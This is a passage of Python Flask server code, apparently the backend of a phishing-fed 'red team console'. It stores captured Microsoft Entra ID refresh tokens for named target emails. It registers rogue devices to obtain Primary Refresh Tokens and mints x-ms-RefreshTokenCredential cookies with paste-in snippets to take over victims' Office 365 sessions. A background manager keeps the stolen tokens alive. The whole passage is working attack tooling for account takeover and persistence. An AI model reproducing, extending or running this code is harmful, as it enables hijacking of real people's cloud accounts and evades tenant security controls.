        return jsonify({'error': str(e)}), 500


# ===== PRT / DRS =====
PRT_MAX_AGE = timedelta(days=25)
_prt_self_heal_lock = threading.Lock()
_prt_self_heal_attempts: Dict[str, float] = {}
PRT_SELF_HEAL_COOLDOWN_SECONDS = int(
    os.environ.get('PRT_SELF_HEAL_COOLDOWN_SECONDS', '300')
)


def _regenerate_prt_for_email(email: str, owner_id: Optional[int] = None) -> Dict[str, Any]:
    """Re-acquire and persist a target PRT without requiring a Flask request."""
    row = get_latest_enrollment_for_email(email, owner_id=owner_id)
    if not row:
        return {
            'success': False,
            'failure_kind': 'no_enrollment',
            'failure_message': 'no enrollment for this target',
        }

    enrollment_id, dir_path, _prt_acquired_at, _created_at = row
    enrollment_dir = Path(dir_path)
    token_row = execute_query(
        """SELECT encrypted_token FROM tokens
           WHERE LOWER(email) = LOWER(?)""",
        params=(email,),
        fetch_one=True,
    )
    if not token_row or not token_row[0]:
        return {
            'success': False,
            'failure_kind': 'no_token',
            'failure_message': 'no live refresh token for this target',
        }

    decrypted = _decrypt_token_payload(token_row[0])
    if not decrypted or not decrypted.get('refresh_token'):
        return {
            'success': False,
            'failure_kind': 'no_token',
            'failure_message': 'stored token could not be decrypted or has no refresh_token',
        }

    refresh_token = decrypted['refresh_token']
    tenant_id = (
        (decrypted.get('user_info') or {}).get('tenantId')
        or decrypted.get('tenant')
        or (decode_jwt(decrypted.get('access_token', '')) or {}).get('tid')
    )
    if not tenant_id:
        return {
            'success': False,
            'failure_kind': 'no_tenant',
            'failure_message': 'could not resolve tenant id for PRT acquisition',
        }

    cert_path = enrollment_dir / 'cert.pem'
    key_path = enrollment_dir / 'key.pem'
    transport_key_path = enrollment_dir / 'transport.key.pem'
    for path in (cert_path, key_path, transport_key_path):
        if not path.exists():
            return {
                'success': False,
                'failure_kind': 'artifacts_missing',
                'failure_message': f'enrollment artifact missing: {path.name}',
            }

    try:
        import importlib
        try:
            prt_mod = importlib.import_module('prt')
        except Exception:
            prt_mod = importlib.import_module('evildev.prt')
    except Exception as e:
        return {
            'success': False,
            'failure_kind': 'import_error',
            'failure_message': f'could not import prt acquisition helper: {e}',
        }

    cooldown_key = email.strip().lower()
    with _prt_self_heal_lock:
        now_ts = time.time()
        last_attempt = _prt_self_heal_attempts.get(cooldown_key)
        if (last_attempt is not None
                and now_ts - last_attempt < PRT_SELF_HEAL_COOLDOWN_SECONDS):
            remaining = int(
                PRT_SELF_HEAL_COOLDOWN_SECONDS - (now_ts - last_attempt)
            )
            return {
                'success': False,
                'failure_kind': 'cooldown',
                'failure_message': 'PRT regeneration recently attempted; cooling down',
                'retry_after_seconds': remaining,
            }
        _prt_self_heal_attempts[cooldown_key] = now_ts
        if len(_prt_self_heal_attempts) > 1000:
            cutoff = now_ts - PRT_SELF_HEAL_COOLDOWN_SECONDS
            for key, attempted_at in list(_prt_self_heal_attempts.items()):
                if attempted_at < cutoff:
                    _prt_self_heal_attempts.pop(key, None)

    try:
        result = prt_mod.acquire_prt(
            tenant_id=tenant_id,
            cert_path=cert_path,
            key_path=key_path,
            transport_key_path=transport_key_path,
            user_credential={'refresh_token': refresh_token},
            attempt_dir=enrollment_dir,
        )
    except Exception as e:
        logger.exception(f'PRT acquisition raised for {email}: {e}')
        return {
            'success': False,
            'failure_kind': 'acquire_exception',
            'failure_message': str(e),
        }

    if not result.get('success'):
        return {
            'success': False,
            'failure_kind': result.get('failure_kind') or 'error',
            'failure_message': result.get('failure_message') or 'PRT acquisition failed',
            'attempt_out': result.get('attempt_out'),
        }

    prt_path = enrollment_dir / 'prt.json'
    session_key_path = enrollment_dir / 'session.key.bin'
    prt_path.write_text(json.dumps({
        'acquired_at': datetime.now(timezone.utc).isoformat(),
        'tenant_id': tenant_id,
        'upn': email,
        'cert_path': str(cert_path),
        'prt': result.get('prt'),
        'wrapped_session_key': result.get('wrapped_session_key'),
    }, indent=2) + '\n', encoding='utf-8')
    session_key_path.write_bytes(result['session_key'])
    try:
        os.chmod(session_key_path, 0o600)
    except Exception:
        pass

    prt_acquired_at = datetime.now(timezone.utc).isoformat()
    try:
        update_enrollment(enrollment_id, prt_acquired_at=prt_acquired_at)
    except Exception:
        pass
    try:
        execute_query(
            "UPDATE targets SET prt_acquired_at = ? WHERE LOWER(email) = LOWER(?)",
            params=(prt_acquired_at, email),
            commit=True,
        )
    except Exception as e:
        logger.warning(f'Could not update target PRT timestamp for {email}: {e}')

    with _prt_self_heal_lock:
        _prt_self_heal_attempts.pop(cooldown_key, None)
    logger.info(f'Regenerated PRT for {email} (enrollment {enrollment_id})')
    return {'success': True}


@app.route('/api/drs/mint-cookie/<path:email>', methods=['POST'])
@requires_auth
def drs_mint_cookie(email):
    if not email or email.strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'error': 'invalid email'}), 400

    user_id = _current_user_id()
    row = get_latest_enrollment_for_email(email, owner_id=user_id if user_id > 0 else None)
    if not row:
        token_exists = False
        try:
            token_row = execute_query(
                "SELECT 1 FROM tokens WHERE LOWER(email) = LOWER(?)",
                params=(email,),
                fetch_one=True,
            )
            token_exists = bool(token_row)
        except Exception:
            token_exists = False
        return jsonify({
            'error': 'no enrollment for this target',
            'failure_kind': 'no_enrollment',
            'hint': (
                'enrollment can be generated automatically from the stored token'
                if token_exists
                else 'no stored token for this target; import or capture a token first'
            ),
            'token_present': token_exists,
        }), 404

    enrollment_id, dir_path, prt_acquired_at, created_at = row
    ed = Path(dir_path)
    prt_file = ed / 'prt.json'
    sk_file = ed / 'session.key.bin'

    acquired = _normalize_utc_datetime(prt_acquired_at)
    now = datetime.now(timezone.utc)
    stale = (
        acquired is None
        or (now - acquired) > PRT_MAX_AGE
        or not prt_file.exists()
        or not sk_file.exists()
    )

    regenerated = False
    regeneration_reason = None

    if stale:
        regenerated = True
        if acquired is None:
            regeneration_reason = 'no_prt_on_record'
        elif (now - acquired) > PRT_MAX_AGE:
            regeneration_reason = 'prt_stale'
        else:
            regeneration_reason = 'artifacts_missing'
        result = _regenerate_prt_for_email(
            email,
            owner_id=user_id if user_id > 0 else None,
        )
        if not result.get('success'):
            kind = result.get('failure_kind') or 'error'
            if kind == 'auth':
                status = 409
                hint = 'the refresh token itself may be dead — re-run the capture'
            elif kind == 'nonce':
                status = 502
                hint = 'transient upstream failure; retry in a few seconds'
            elif kind == 'cooldown':
                status = 429
                hint = None
            elif kind in ('no_token', 'no_tenant'):
                status = 409
                hint = 'check the stored token and tenant, or re-run the capture'
            elif kind == 'artifacts_missing':
                status = 409
                hint = None
            else:
                status = 500
                hint = 'check the attempt record on disk for the raw DRS response'
            response = {
                'error': result.get('failure_message') or 'PRT acquisition failed',
                'enrollment_id': enrollment_id,
                'regenerated_prt': False,
                'regeneration_reason': regeneration_reason,
                'failure_kind': kind,
            }
            if hint:
                response['hint'] = hint
            for field in ('retry_after_seconds', 'attempt_out'):
                if result.get(field) is not None:
                    response[field] = result[field]
            return jsonify(response), status
        regenerated = True

    try:
        data = json.loads(prt_file.read_text(encoding='utf-8'))
        prt_value = data.get('prt')
        if not prt_value:
            raise RuntimeError('prt.json had no prt field')
        session_key = sk_file.read_bytes()
        if len(session_key) != 32:
            raise RuntimeError(
                f'session key is {len(session_key)} bytes, expected 32'
            )
        if prt_snippet is None:
            raise RuntimeError('prt_snippet module not available')
        nonce = prt_snippet.acquire_nonce(timeout=30.0)
        cookie = prt_snippet.create_prt_cookie(prt_value, session_key, nonce)
    except Exception as e:
        logger.exception(f'mint-cookie failed for {email}: {e}')
        return jsonify({
            'error': str(e),
            'enrollment_id': enrollment_id,
            'regenerated_prt': regenerated,
        }), 500

    try:
        update_enrollment(
            enrollment_id,
            last_cookie_at=datetime.now(timezone.utc).isoformat(),
        )
    except Exception:
        pass

    try:
        snippet = prt_snippet.build_snippet(
            cookie=cookie,
            upn=email,
            tenant=os.environ.get('PRT_SNIPPET_TENANT', 'common'),
            client_id=os.environ.get('PRT_SNIPPET_CLIENT_ID', '4765445b-32c6-49b0-83e6-1d93765276ca'),
            redirect_uri=os.environ.get('PRT_SNIPPET_REDIRECT_URI', 'https://www.office.com/landing'),
            scope=os.environ.get('PRT_SNIPPET_SCOPE', 'openid profile'),
            target_url=os.environ.get('PRT_SNIPPET_TARGET_URL', 'https://www.office.com/?auth=2'),
            domain_hint=os.environ.get('PRT_SNIPPET_DOMAIN_HINT', 'organizations'),
        )
    except Exception as e:
        logger.warning(f'Could not build snippet for {email}: {e}')
        snippet = None

    return jsonify({
        'success': True,
        'email': email,
        'enrollment_id': enrollment_id,
        'cookie': cookie,
        'cookie_name': 'x-ms-RefreshTokenCredential',
        'cookie_domain': '.login.microsoftonline.com',
        'snippet': snippet,
        'expires_in_seconds': 300,
        'acquired_at': datetime.now(timezone.utc).isoformat(),
        'regenerated_prt': regenerated,
        'regeneration_reason': regeneration_reason,
    })


@app.route('/api/drs/re-enroll/<path:email>', methods=['POST', 'OPTIONS'])
@requires_auth
def drs_re_enroll(email):
    if request.method == 'OPTIONS':
        return ('', 204)

    if not email or email.strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'error': 'invalid email'}), 400

    email = email.strip().lower()

    try:
        target_row = execute_query(
            "SELECT email, status, drs_enrolled_at FROM targets "
            "WHERE LOWER(email) = LOWER(?)",
            params=(email,),
            fetch_one=True,
        )
    except Exception as e:
        logger.error(f're-enroll lookup failed for {email}: {e}')
        return jsonify({'error': 'database error', 'detail': str(e)}), 500

    if not target_row:
        return jsonify({'error': 'target not found', 'email': email}), 404

    # ── Single-flight guard ─────────────────────────────────────────────
    # Prevents two concurrent re-enroll pipelines for the same target.
    # Without this, a double-click on Mint during a 20s enrollment spawns
    # TWO enrollment.py processes, each registering a device in Azure AD
    # — consuming two of the 50-per-user device slots on the tenant. Only
    # the first request proceeds; the second returns 409 in_progress in
    # <5ms. Lock is per-email so different targets still parallelize.
    _lock = _reenroll_lock_for(email)
    if not _lock.acquire(blocking=False):
        logger.info(
            f're-enroll rejected (in progress) for {email}: '
            f'second concurrent request'
        )
        return jsonify({
            'success': False,
            'email': email,
            'error': 'a re-enroll is already running for this target; '
                     'wait for it to finish before retrying',
            'failure_kind': 'in_progress',
            'skipped_retry': True,
        }), 409

    try:
        # Pre-flight: skip known permanent tenant-policy failures. Uses the
        # shared classifier so the kind returned matches what api_vault_list
        # shows on the DRS badge — otherwise the modal would say "policy" for
        # a row that the badge labels "device cap".
        try:
            prev = execute_query(
                "SELECT drs_enrolled_error FROM targets WHERE LOWER(email) = LOWER(?)",
                params=(email,),
                fetch_one=True,
            )
            if prev and prev[0]:
                p = str(prev[0]).lower()
                if any(m in p for m in (
                    'devicecapreached',
                    'not eligible to enroll',
                    'administrator policy does not allow',
                    'does not allow this user',
                    'aadsts50105',
                    'aadsts65001',
                    'aadsts700016',
                )):
                    kind, hint = _classify_drs_failure(prev[0])
                    return jsonify({
                        'success': False,
                        'email': email,
                        'error': prev[0],
                        'failure_kind': kind or 'policy',
                        'hint': hint or (
                            'This tenant policy blocks enrollment for this '
                            'account. Free a device slot in Azure AD, ask a '
                            'tenant admin to enable device join, or skip this '
                            'target.'
                        ),
                        'skipped_retry': True,
                    }), 409
        except Exception as e:
            logger.warning(f're-enroll pre-flight check failed for {email}: {e}', exc_info=True)

        script = Path(__file__).resolve().parent / 'run_pipeline.py'
        if not script.exists():
            return jsonify({
                'error': 'run_pipeline.py not found',
                'expected': str(script),
            }), 500

        existing_marker = target_row[2] if target_row else None
        has_existing_enrollment = bool(
            existing_marker
            and not str(existing_marker).startswith('FAILED:')
        )

        cmd = [sys.executable, str(script), '--email', email, '--mark']
        if has_existing_enrollment:
            cmd.append('--force-reenroll')

        env = os.environ.copy()
        env.setdefault('PYTHONUNBUFFERED', '1')

        started_at = datetime.now(timezone.utc)
        logger.info(f're-enroll starting for {email}: {" ".join(cmd)}')

        try:
            proc = subprocess.run(
                cmd,
                cwd=str(Path(__file__).resolve().parent),
                capture_output=True,
                text=True,
                timeout=300,
                env=env,
            )
        except subprocess.TimeoutExpired:
            elapsed = (datetime.now(timezone.utc) - started_at).total_seconds()
            logger.warning(f're-enroll timed out for {email}')
            return jsonify({
                'success': False,
                'email': email,
                'error': 're-enroll timed out after 300s',
                'duration_ms': int(elapsed * 1000),
            }), 504
        except Exception as e:
            logger.exception(f're-enroll spawn failed for {email}: {e}')
            return jsonify({
                'success': False,
                'email': email,
                'error': f'failed to spawn pipeline: {e}',
            }), 500

        finished_at = datetime.now(timezone.utc)
        duration_ms = int((finished_at - started_at).total_seconds() * 1000)

        stdout_tail = (proc.stdout or '')[-4000:]
        stderr_tail = (proc.stderr or '')[-4000:]

        failure_kind = None
        failure_message = None
        if proc.returncode != 0:
            import re as _re
            # run_pipeline.py writes [fail] lines to stderr, not stdout; scan
            # both so failure_kind/failure_message surface in the 500 body.
            combined_output = (proc.stdout or '') + '\n' + (proc.stderr or '')
            failure_match = _re.search(
                rf'^\[fail\]\s+{_re.escape(email)}\s*:\s*([^:]+):\s*(.+)$',
                combined_output,
                _re.MULTILINE | _re.IGNORECASE,
            )
            if failure_match:
                raw_kind = failure_match.group(1).strip()
                failure_message = failure_match.group(2).strip()
                normalized_kind, _ = _classify_drs_failure(
                    raw_kind + ': ' + failure_message
                )
                failure_kind = normalized_kind or raw_kind

        artifacts_ok = False
        missing_artifacts = []
        artifact_error = None
        artifact_dir = None
        if proc.returncode == 0:
            try:
                row2 = get_latest_enrollment_for_email(email)
                if row2:
                    _eid, dir_path, _prt, _created = row2
                    artifact_dir = dir_path
                    if dir_path:
                        ed = Path(dir_path)
                        required_artifacts = (
                            'cert.pem', 'key.pem', 'transport.key.pem',
                            'meta.json', 'prt.json', 'session.key.bin',
                        )
                        missing_artifacts = [
                            name for name in required_artifacts
                            if not (ed / name).is_file()
                        ]
                        if not missing_artifacts:
                            try:
                                metadata = json.loads(
                                    (ed / 'meta.json').read_text(encoding='utf-8')
                                )
                                prt_data = json.loads(
                                    (ed / 'prt.json').read_text(encoding='utf-8')
                                )
                                if not isinstance(metadata, dict):
                                    raise ValueError('meta.json is not an object')
                                if not isinstance(prt_data, dict) or not prt_data.get('prt'):
                                    raise ValueError('prt.json has no PRT value')
                                if len((ed / 'session.key.bin').read_bytes()) != 32:
                                    raise ValueError('session.key.bin is not 32 bytes')
                                artifacts_ok = True
                            except Exception as e:
                                artifact_error = str(e)
            except Exception as e:
                logger.warning(f're-enroll artifact verification failed for {email}: {e}')
                artifact_error = str(e)

        if proc.returncode == 0 and artifacts_ok:
            logger.info(
                f're-enroll succeeded for {email} in {duration_ms}ms (dir={artifact_dir})'
            )
            return jsonify({
                'success': True,
                'email': email,
                'returncode': 0,
                'duration_ms': duration_ms,
                'started_at': started_at.isoformat(),
                'finished_at': finished_at.isoformat(),
                'artifacts_ok': True,
                'enrollment_dir': artifact_dir,
                'missing_artifacts': [],
                'stdout_tail': stdout_tail,
                'stderr_tail': stderr_tail,
            })

        logger.warning(
            f're-enroll failed for {email} '
            f'(rc={proc.returncode}, artifacts_ok={artifacts_ok}) in {duration_ms}ms'
        )
        return jsonify({
            'success': False,
            'email': email,
            'returncode': proc.returncode,
            'failure_kind': failure_kind,
            'failure_message': failure_message,
            'duration_ms': duration_ms,
            'started_at': started_at.isoformat(),
            'finished_at': finished_at.isoformat(),
            'artifacts_ok': artifacts_ok,
            'enrollment_dir': artifact_dir,
            'missing_artifacts': missing_artifacts,
            'artifact_error': artifact_error,
            'stdout_tail': stdout_tail,
            'stderr_tail': stderr_tail,
        }), 500
    finally:
        _lock.release()


# ===== REFRESH-MANAGER RETRY =====
@app.route('/api/refresh-manager/retry/<path:email>', methods=['POST'])
@requires_auth
def refresh_manager_retry(email):
    manager = token_refresh_manager
    email_norm = (email or '').strip()
    if not email_norm:
        return jsonify({'ok': False, 'error': 'invalid email'}), 400

    get_token = getattr(manager, 'get_token', None)
    entry = get_token(email_norm) if callable(get_token) else None

    if not entry:
        loader = getattr(manager, 'load_token_from_db', None)
        if callable(loader) and loader(email_norm):
            entry = get_token(email_norm)

    if not entry:
        return jsonify({'ok': False, 'error': 'not tracked by manager'}), 404
    lock = getattr(manager, '_lock', threading.Lock())
    with lock:
        if getattr(entry, 'health', None) == getattr(TokenHealth, 'REVOKED', None):
            return jsonify({'ok': False, 'error': 'token is revoked; re-capture required'}), 409
        entry.abandoned = False
        entry.consecutive_failures = 0
        entry.last_error = None
        entry.cooldown_until = None
        entry.next_backoff_seconds = 0.0
        entry.reauth_initiated = False
        healthy = getattr(TokenHealth, 'HEALTHY', 'healthy')
        fragile = getattr(TokenHealth, 'FRAGILE', 'fragile')
        entry.health = fragile if getattr(entry, 'fragile', False) else healthy
    return jsonify({'ok': True, 'email': email_norm})


@app.route('/api/refresh-manager/status')
@requires_auth
def refresh_manager_status():
    try:
        report = token_refresh_manager.get_stats() if hasattr(token_refresh_manager, 'get_stats') else {}
        health = token_refresh_manager.get_token_health_report()
        return jsonify({'status': report, 'health': health})
    except Exception as e:
        logger.error(f"Failed to fetch refresh manager status: {e}", exc_info=True)
        return jsonify({
            'status': {
                'total_tokens': 0, 'active_tokens': 0, 'dead_tokens': 0,
                'fragile_tokens': 0, 'expiring_tokens': 0, 'pending_reauth': 0,
                'is_running': False, 'last_cycle': None,
                'total_refreshes': 0, 'successful_refreshes': 0,
                'failed_refreshes': 0, 'reauth_initiated': 0,
            },
            'health': [],
            'error': str(e),
        }), 200


@app.route('/api/refresh-manager/refresh/<path:email>', methods=['POST'])
@requires_auth
def refresh_manager_manual(email):
    if not email or email.strip().lower() in ('', 'email', 'null', 'undefined'):
        return jsonify({'ok': False, 'error': 'invalid email'}), 400
    try:
        result = token_refresh_manager.refresh_single(email)
        result['ok'] = bool(result.get('success'))
        return jsonify(result)
    except Exception as e:
        logger.exception(f'refresh_single raised for {email}: {e}')
        return jsonify({'ok': False, 'error': str(e)}), 500


# ===== HEALTH =====
@app.route('/health')
def health():
    db_ok = True
    try:
        execute_query("SELECT 1", fetch_one=True)
    except Exception:
        db_ok = False
    return jsonify({
        'status': 'ok' if db_ok else 'degraded',
        'timestamp': datetime.now(timezone.utc).isoformat(),
        'version': 'vault-1.0',
        'db_connected': db_ok,
    })


# ===== BOOT =====
try:
    init_db()
    logger.info("Database initialized")
except Exception as e:
    logger.error(f"init_db failed: {e}")

try:
    token_refresh_manager.start()
    logger.info(
        f"Token refresh worker started "
        f"(running={token_refresh_manager.is_running()})"
    )
except Exception as e:
    logger.error(f"Failed to start token refresh worker: {e}")

if _resolved_key_name:
    logger.info(f"Encryption key resolved from {_resolved_key_name}")
else:
    logger.warning(
        "No encryption key set (TOKEN_ENCRYPTION_KEY / WORM_MASTER_KEY / "
        "ENCRYPTION_KEY); token writes will fail closed"
    )

if REQUIRE_AUTH and not OPERATOR_KEYS:
    logger.warning(
        "REQUIRE_AUTH is on but no AUTH_KEY/API_KEY/PHISH_PORTAL_KEY set — "
        "only the login page (form auth) is usable."
    )


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('FLASK_DEBUG', '').lower() in ('1', 'true', 'yes')
    logger.info("=" * 60)
    logger.info("VAULT-ONLY RED TEAM CONSOLE")
    logger.info("=" * 60)
    logger.info(f"Listening on :{port}")
    logger.info(f"Vault: http://localhost:{port}/vault")
    logger.info("=" * 60)
    app.run(host='0.0.0.0', port=port, debug=debug, threaded=True, use_reloader=False)
